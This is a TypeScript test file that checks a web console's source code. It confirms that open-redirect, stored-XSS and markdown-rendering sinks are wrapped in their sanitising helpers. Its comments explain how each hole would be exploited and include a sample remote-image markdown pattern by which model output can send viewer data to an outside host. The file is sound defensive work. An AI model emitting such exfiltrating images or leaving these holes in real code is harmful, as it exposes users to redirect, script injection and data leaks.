import { test } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, readdirSync, statSync } from 'node:fs'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

/**
 * The three places the console hands something it did not author to a renderer
 * that will trust it.
 *
 * Each has a helper with its own unit tests — `safeRedirectPath`, `escapeHtml`,
 * `withMarkdownSafety`. Those prove the helper is right. None of them proves it
 * is CALLED, and an uncalled guard is indistinguishable from an absent one: no
 * test fails, no type complains, and the page behaves exactly as it did while it
 * was vulnerable. So the wiring is asserted here, over the source, the way the
 * `/api/v2` prefix guard is.
 *
 * A new sink added to one of these shapes fails this file rather than shipping.
 */

const SRC = fileURLToPath(new URL('../src', import.meta.url))

function walk(dir: string): string[] {
  return readdirSync(dir).flatMap((entry) => {
    const full = join(dir, entry)
    if (statSync(full).isDirectory()) return walk(full)
    return /\.(ts|tsx)$/.test(entry) ? [full] : []
  })
}

const files = walk(SRC).map((file) => ({
  rel: file.slice(SRC.length + 1),
  body: readFileSync(file, 'utf8'),
}))

/**
 * Open redirect. The value lands in `window.location.href` (and in
 * sessionStorage for the SSO leg) AFTER the session token is in localStorage, so
 * an unvalidated one hands the victim to the attacker already signed in.
 *
 * The sinks are listed rather than discovered: a `location.href =` grep catches
 * the ones that build their own URL with encodeURIComponent too, and those are
 * not sinks. Listing them means a NEW sink is caught by review, while a
 * REGRESSION in one of these three is caught here.
 */
test('every login-redirect sink routes through safeRedirectPath', () => {
  const sinks = [
    // Reads ?redirect= — covers both consumers below it, the location.href
    // assignment and the sessionStorage write the SSO leg parks for /auth/callback.
    { rel: 'app/login/page.tsx', reads: "searchParams.get('redirect')" },
    // Re-checked on the way out, so a sessionStorage entry written by anything
    // other than the login page cannot steer this navigation off-origin.
    {
      rel: 'app/auth/callback/callback-handler.tsx',
      reads: 'sessionStorage.getItem(STORAGE_REDIRECT_AFTER_LOGIN)',
    },
  ]

  for (const sink of sinks) {
    const file = files.find((f) => f.rel === sink.rel)
    assert.ok(file, `${sink.rel} has moved — re-point this guard at it`)
    assert.ok(
      file.body.includes(`safeRedirectPath(${sink.reads})`),
      `${sink.rel} must wrap ${sink.reads} in safeRedirectPath(), or the raw ` +
        'value reaches a navigation and the open redirect is back',
    )
  }
})

/**
 * Stored XSS in the 3D graphs. react-force-graph's hover tooltip is rendered by
 * float-tooltip, whose `.html()` is a d3 innerHTML assignment, and its default
 * `nodeLabel` accessor is the literal string 'name'. So omitting the prop is not
 * a neutral default — it is the vulnerability. In the state graph the name comes
 * out of the uploaded state blob, so workspace write becomes script execution
 * for anyone holding plan.
 */
test('every ForceGraph3D call site passes an escaping nodeLabel', () => {
  const callSites = files.filter((f) => f.body.includes('<FG3D'))

  assert.ok(callSites.length >= 2, `expected both graph renderers, found ${callSites.length}`)

  for (const { rel, body } of callSites) {
    assert.match(
      body,
      /nodeLabel=\{\(n\) => escapeHtml\(/,
      `${rel} renders a ForceGraph3D without an escaping nodeLabel. The default ` +
        "accessor ('name') puts the raw value into the tooltip's innerHTML",
    )
  }
})

/**
 * Remote-image exfiltration through model output. `![](https://x/p.png?d=…)` is
 * ordinary markdown — react-markdown's refusal of raw HTML does not touch it —
 * and it fires on render, carrying the viewer's IP and a referer naming the
 * Terrapod host. Every ReactMarkdown over model prose needs the components map
 * that drops `img`.
 */
test('every ReactMarkdown element is given a components map', () => {
  const offenders: string[] = []
  const guarded: string[] = []

  for (const { rel, body } of files) {
    if (!body.includes('<ReactMarkdown')) continue
    // Each element runs from its tag to the `>` that opens its children.
    for (const element of body.matchAll(/<ReactMarkdown[\s\S]*?>/g)) {
      const open = element[0]
      const line = body.slice(0, element.index).split('\n').length
      if (/components=\{/.test(open)) guarded.push(`${rel}:${line}`)
      else offenders.push(`${rel}:${line}  ${open.split('\n')[0].trim()}`)
    }
  }

  assert.ok(guarded.length >= 8, `expected the known AI surfaces, found ${guarded.length}`)
  assert.deepEqual(
    offenders,
    [],
    'these render markdown with no components map, so a model-authored remote ' +
      'image fetches on behalf of the viewer. Pass MARKDOWN_SAFETY, or ' +
      'withMarkdownSafety(yourStylingMap):\n' + offenders.join('\n'),
  )
})

/**
 * The maps themselves. Three surfaces style their markdown and two of those
 * style `a`, so a plain `{ ...SAFETY, ...overrides }` spread would silently drop
 * the rel. withMarkdownSafety wraps instead — this asserts the maps actually go
 * through it rather than being hand-merged back.
 */
test('every markdown styling map is layered through withMarkdownSafety', () => {
  const offenders: string[] = []
  const layered: string[] = []

  for (const { rel, body } of files) {
    // Matches the whole declaration head, not a guessed shape for it: a guard
    // that recognises only the CORRECT form reports nothing at all once the
    // code is wrong, and passes.
    for (const decl of body.matchAll(/^const (\w*MARKDOWN\w*|MD) =(.*)$/gm)) {
      const line = body.slice(0, decl.index).split('\n').length
      if (decl[2].trim().startsWith('withMarkdownSafety({')) layered.push(`${rel}:${line}`)
      else offenders.push(`${rel}:${line}  ${decl[0].trim()}`)
    }
  }

  // Without this floor the test passes when it finds nothing, which is exactly
  // what happens if a map is renamed or restructured out of recognition.
  assert.ok(layered.length >= 3, `expected the three styling maps, found ${layered.length}`)
  assert.deepEqual(
    offenders,
    [],
    'a markdown components map must be wrapped in withMarkdownSafety() so img ' +
      'is dropped and a styled `a` still carries the rel:\n' + offenders.join('\n'),
  )
})
